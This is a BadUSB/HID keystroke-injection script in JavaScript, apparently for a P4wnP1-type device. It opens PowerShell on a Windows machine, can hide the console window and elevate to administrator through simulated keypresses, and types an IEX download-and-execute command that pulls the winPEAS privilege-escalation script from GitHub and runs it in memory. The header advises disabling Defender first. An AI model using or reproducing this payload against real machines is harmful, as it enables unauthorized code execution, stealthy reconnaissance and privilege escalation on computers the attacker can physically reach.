/*
Invoke WinPeas.ps1 via web. First disable Defender!
author: Klau5t4ler0x90
*/

ps_wow64='%SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe'
ps="powershell.exe"

// sets typing speed to "natural"
function natural() {
  typingSpeed(100,150)	// Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)
}

// sets typing speed as fast as possible
function fast() {
  typingSpeed(0,0)
}

// Open an interactive PowerShell console (Windows)
function startPS() {
	press("GUI r");
	delay(1000);
	type("powershell.exe");
  press("ENTER");
}

// Hide an already opened PowerShell console, but keep input focus, to gon on typing
function hidePS() {
	type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
  	press("ENTER");
}

// On a powershell prompt, check if the running PS is 32bit, start an inline 32bit PowerShell, otherwise.
function assurePS32() {
  type("if ([IntPtr]::Size -ne 4){& $env:SystemRoot\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe}\n");
  delay(500);
}

function win10AsAdmin() {
    press("GUI"); //open search
    delay(500);
    type(ps); //enter target binary
    delay(1000); // wait for search to finish
    press("RIGHT");
    delay(200);
    press("DOWN");
    delay(200);
    press("ENTER");
    delay(1000); 
    press("LEFT");
    press("ENTER");
}

// Execute Invoke-SentryScript.ps1 from Web over IEX
function hidDownAndIEX() {
  type("IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')")
  press("ENTER");
}

layout('us');			// DE keyboard layout
fast();

startPS();
delay(500);
//assurePS32();
//delay(500);
//hidePS();
//delay(500);
hidDownAndIEX();
